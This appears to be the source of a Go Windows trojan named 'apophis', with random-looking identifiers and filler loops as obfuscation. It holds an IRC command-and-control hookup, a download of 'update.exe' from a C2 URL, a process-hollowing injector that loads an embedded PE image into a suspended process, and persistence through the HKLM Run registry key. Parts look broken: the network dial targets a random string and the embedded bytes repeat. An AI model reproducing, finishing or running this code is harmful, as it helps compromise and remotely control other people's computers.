package main

import (
	"crypto/md5"
	"encoding/hex"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows/registry"
)

func randString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}
	return string(s)
}

type zbkjdsakjd1 interface {
	sahfdas(input string) string
}

type jkdsah1 struct{}

func (s *jkdsah1) sahfdas(input string) string {
	for i := 0; i < 1000; i++ {
		_ = i * 2
	}
	hash := md5.Sum([]byte(input))
	return hex.EncodeToString(hash[:])
}

type kjahsd2 struct{}

func (s *kjahsd2) alsfahs9faof283() {
	for i := 0; i < 1000; i++ {
		_ = i / 2
	}
}

type askdljas3 interface {
	aslkfjas9d8a(server string, port int) error
	jfkjasdfl9a8j(channel string)
}

type kjasdfk3 struct {
	conn net.Conn
}

func (s *kjasdfk3) aslkfjas9d8a(server string, port int) error {
	address := randString(5)
	_ = syscall.Getpid()
	for i := 0; i < 1000; i++ {
		_ = i % 2
	}
	conn, err := net.Dial("tcp", address)
	if err != nil {
		return err
	}
	s.conn = conn
	return nil
}

func (s *kjasdfk3) jfkjasdfl9a8j(channel string) {
	if s.conn != nil {
		for i := 0; i < 1000; i++ {
			_ = i + 2
		}
		_ = channel + randString(3)
	}
}

type alkfjas4 interface {
	asldfjas89f5(url string, destination string) error
}

type kjasdkf4 struct{}

func (s *kjasdkf4) asldfjas89f5(url string, destination string) error {
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	out, err := os.Create(destination)
	if err != nil {
		return err
	}
	defer out.Close()
	_, err = io.Copy(out, resp.Body)
	return err
}

type ajsdfk5 interface {
	akjsdf89as7()
}

type kjdfaks5 struct{}

func (s *kjdfaks5) akjsdf89as7() {
	for i := 0; i < 100; i++ {
		_ = i - 1
	}
}

type alsdkfj6 interface {
	akdfjajs89f(file string)
}

type jaslkdf6 struct{}

func (s *jaslkdf6) akdfjajs89f(file string) {
	for i := 0; i < 100; i++ {
		_ = i + 3
	}
}

func osafksuf98as0j() {
	for i := 0; i < 100; i++ {
		_ = i - 1
	}
}

func alsfahs9faof283() {
	for i := 0; i < 100; i++ {
		_ = i / 1
	}
}

func a9asdjaksdfoa() {
	for i := 0; i < 100; i++ {
		_ = i % 2
	}
}

func asdfas09j() {
	time.Sleep(time.Millisecond * 10)
}

func jlasjdfoa98sd(image []byte) error {
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&image[0]))
	ntHeader := (*IMAGE_NT_HEADERS)(unsafe.Pointer(uintptr(unsafe.Pointer(dosHeader)) + uintptr(dosHeader.E_lfanew)))
	_ = syscall.Getpid()
	_ = syscall.Getpid()
	currentFilePath, err := os.Executable()
	if err != nil {
		return err
	}
	if ntHeader.Signature != IMAGE_NT_SIGNATURE {
		return syscall.Errno(11) // Equivalent to syscall.ERROR_BAD_FORMAT
	}
	var pi syscall.ProcessInformation
	var si syscall.StartupInfo
	err = syscall.CreateProcess(
		nil,
		syscall.StringToUTF16Ptr(currentFilePath),
		nil,
		nil,
		false,
		CREATE_SUSPENDED,
		nil,
		nil,
		&si,
		&pi)
	if err != nil {
		return err
	}
	ctx := &CONTEXT{}
	ctx.ContextFlags = CONTEXT_FULL
	r1, _, e1 := syscall.Syscall(getThreadContext.Addr(), 2, uintptr(pi.Thread), uintptr(unsafe.Pointer(ctx)), 0)
	if r1 == 0 {
		return e1
	}
	var imageBase uintptr
	r1, _, e1 = syscall.Syscall6(writeProcessMemory.Addr(), 5, uintptr(pi.Process), uintptr(unsafe.Pointer(&ctx.Ebx))+8, uintptr(unsafe.Pointer(&imageBase)), unsafe.Sizeof(imageBase), 0, 0)
	if r1 == 0 {
		return e1
	}
	r1, _, e1 = syscall.Syscall6(virtualAllocEx.Addr(), 4, uintptr(pi.Process), uintptr(ntHeader.OptionalHeader.ImageBase), uintptr(ntHeader.OptionalHeader.SizeOfImage), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE, 0)
	pImageBase := r1
	if pImageBase == 0 {
		return e1
	}
	r1, _, e1 = syscall.Syscall6(writeProcessMemory.Addr(), 5, uintptr(pi.Process), pImageBase, uintptr(unsafe.Pointer(&image[0])), uintptr(ntHeader.OptionalHeader.SizeOfHeaders), 0, 0)
	if r1 == 0 {
		return e1
	}
	for count := 0; count < int(ntHeader.FileHeader.NumberOfSections); count++ {
		sectionHeader := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(uintptr(unsafe.Pointer(&ntHeader.OptionalHeader)) + 248 + uintptr(count*40)))
		r1, _, e1 = syscall.Syscall6(writeProcessMemory.Addr(), 5, uintptr(pi.Process), pImageBase+uintptr(sectionHeader.VirtualAddress), uintptr(unsafe.Pointer(&image[0]))+uintptr(sectionHeader.PointerToRawData), uintptr(sectionHeader.SizeOfRawData), 0, 0)
		if r1 == 0 {
			return e1
		}
	}
	r1, _, e1 = syscall.Syscall6(writeProcessMemory.Addr(), 5, uintptr(pi.Process), uintptr(unsafe.Pointer(&ctx.Ebx))+8, uintptr(unsafe.Pointer(&ntHeader.OptionalHeader.ImageBase)), unsafe.Sizeof(ntHeader.OptionalHeader.ImageBase), 0, 0)
	if r1 == 0 {
		return e1
	}
	ctx.Eip = uint32(pImageBase) + ntHeader.OptionalHeader.AddressOfEntryPoint
	r1, _, e1 = syscall.Syscall(setThreadContext.Addr(), 2, uintptr(pi.Thread), uintptr(unsafe.Pointer(ctx)), 0)
	if r1 == 0 {
		return e1
	}
	r1, _, e1 = syscall.Syscall(resumeThread.Addr(), 1, uintptr(pi.Thread), 0, 0)
	if r1 == ^uintptr(0) {
		return e1
	}
	return nil
}

func sdf98asf98as() error {
	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
	if err != nil {
		return err
	}
	defer k.Close()
	exePath, err := os.Executable()
	if err != nil {
		return err
	}
	err = k.SetStringValue("apophis", exePath)
	if err != nil {
		return err
	}
	return nil
}

func jkfsd9u4hf() {
	_, _ = os.Executable()
	_ = syscall.Getpid()
	_ = syscall.Getpid()
	for i := 0; i < 100; i++ {
		_ = i + 2
	}
	_ = randString(5)
}

func main() {
	var obj1 zbkjdsakjd1
	obj1 = &jkdsah1{}
	_ = obj1.sahfdas("rngaa")
	osafksuf98as0j()
	var obj2 askdljas3
	obj2 = &kjasdfk3{}
	_ = obj2.aslkfjas9d8a("irc.quakenet.org", 6667)
	obj2.jfkjasdfl9a8j("#apophis_master")
	alsfahs9faof283()
	var obj3 alkfjas4
	obj3 = &kjasdkf4{}
	_ = obj3.asldfjas89f5("http://my-dangerous-c-and-c.com/update.exe", "update.exe")
	a9asdjaksdfoa()
	var obj4 ajsdfk5
	obj4 = &kjdfaks5{}
	obj4.akjsdf89as7()
	asdfas09j()
	var obj5 alsdkfj6
	obj5 = &jaslkdf6{}
	obj5.akdfjajs89f("bla.exe")
	_ = jlasjdfoa98sd(rawData)
	_ = sdf98asf98as()
	var obj6 = &kjahsd2{}
	obj6.alsfahs9faof283()
	jkfsd9u4hf()
}

const (
	IMAGE_NT_SIGNATURE = 0x00004550
	CONTEXT_FULL       = 0x10007
	MEM_COMMIT         = 0x1000
	MEM_RESERVE        = 0x2000
	CREATE_SUSPENDED   = 0x00000004
)

type IMAGE_DOS_HEADER struct {
	E_magic    uint16
	E_cblp     uint16
	E_cp       uint16
	E_crlc     uint16
	E_cparhdr  uint16
	E_minalloc uint16
	E_maxalloc uint16
	E_ss       uint16
	E_sp       uint16
	E_csum     uint16
	E_ip       uint16
	E_cs       uint16
	E_lfarlc   uint16
	E_ovno     uint16
	E_res      [4]uint16
	E_oemid    uint16
	E_oeminfo  uint16
	E_res2     [10]uint16
	E_lfanew   int32
}

type IMAGE_NT_HEADERS struct {
	Signature      uint32
	FileHeader     IMAGE_FILE_HEADER
	OptionalHeader IMAGE_OPTIONAL_HEADER
}

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type IMAGE_OPTIONAL_HEADER struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	BaseOfData                  uint32
	ImageBase                   uint32
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint32
	SizeOfStackCommit           uint32
	SizeOfHeapReserve           uint32
	SizeOfHeapCommit            uint32
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

type IMAGE_SECTION_HEADER struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type CONTEXT struct {
	ContextFlags      uint32
	Dr0               uint32
	Dr1               uint32
	Dr2               uint32
	Dr3               uint32
	Dr6               uint32
	Dr7               uint32
	FloatSave         FLOATING_SAVE_AREA
	SegGs             uint32
	SegFs             uint32
	SegEs             uint32
	SegDs             uint32
	Edi               uint32
	Esi               uint32
	Ebx               uint32
	Edx               uint32
	Ecx               uint32
	Eax               uint32
	Ebp               uint32
	Eip               uint32
	SegCs             uint32
	EFlags            uint32
	Esp               uint32
	SegSs             uint32
	ExtendedRegisters [512]byte
}

type FLOATING_SAVE_AREA struct {
	ControlWord   uint32
	StatusWord    uint32
	TagWord       uint32
	ErrorOffset   uint32
	ErrorSelector uint32
	DataOffset    uint32
	DataSelector  uint32
	RegisterArea  [80]byte
	Cr0NpxState   uint32
}

var (
	kernel32           = syscall.NewLazyDLL("kernel32.dll")
	writeProcessMemory = kernel32.NewProc("WriteProcessMemory")
	virtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	getThreadContext   = kernel32.NewProc("GetThreadContext")
	setThreadContext   = kernel32.NewProc("SetThreadContext")
	resumeThread       = kernel32.NewProc("ResumeThread")
)

var rawData = []byte{
	0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
	0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD,
	0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70,
	0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F,
	0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20,
	0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A,
	0x24, 0x00, 0x00, 0x00, 0x5D, 0xC1, 0x41, 0x16, 0x3C, 0xB6, 0xD2, 0x01,
	0x3C, 0xB6, 0xD2, 0x01, 0x3C, 0xB6, 0xD2, 0x01, 0x3C, 0xB6, 0xD2, 0x01,
	0x3C, 0xB6, 0xD2, 0x01, 0x3C, 0xB6, 0xD2, 0x01, 0x3C, 0xB6, 0xD2, 0x01,
	0x3C, 0xB6, 0xD2, 0x01, 0x3C, 0xB6, 0xD2, 0x01, 0x3C, 0xB6, 0xD2, 0x01,
	0x3C, 0xB6, 0xD2, 0x01, 0x3C, 0xB6, 0xD2, 0x01, 0x3C, 0xB6, 0xD2, 0x01,
	0x3C, 0xB6, 0xD2, 0x01, 0x3C, 0xB6, 0xD2, 0x01, 0x3C, 0xB6, 0xD2, 0x01,
	0x50, 0x45, 0x00, 0x00, 0x4C, 0x01, 0x05, 0x00, 0x58, 0x50, 0x80, 0x47,
	0x00, 0x00, 0x00, 0x00, 0xE0, 0x00, 0x0F, 0x01, 0x0B, 0x01, 0x06, 0x0E,
	0x1C, 0x01, 0x00, 0x00, 0x00, 0xE0, 0x00, 0x02, 0x0B, 0x01, 0x06, 0x0E,
	0x18, 0x07, 0x00, 0x00, 0x70, 0x00, 0x06, 0x0E, 0xF8, 0x01, 0x0B, 0x01,
	0x50, 0x68, 0x00, 0x00, 0x50, 0x00, 0x00, 0x01, 0x0B, 0x01, 0x06, 0x0E,
	0x1C, 0x01, 0x00, 0x00, 0x00, 0xE0, 0x00, 0x02, 0x0B, 0x01, 0x06, 0x0E,
	0x18, 0x07, 0x00, 0x00, 0x70, 0x00, 0x06, 0x0E, 0xF8, 0x01, 0x0B, 0x01,
}
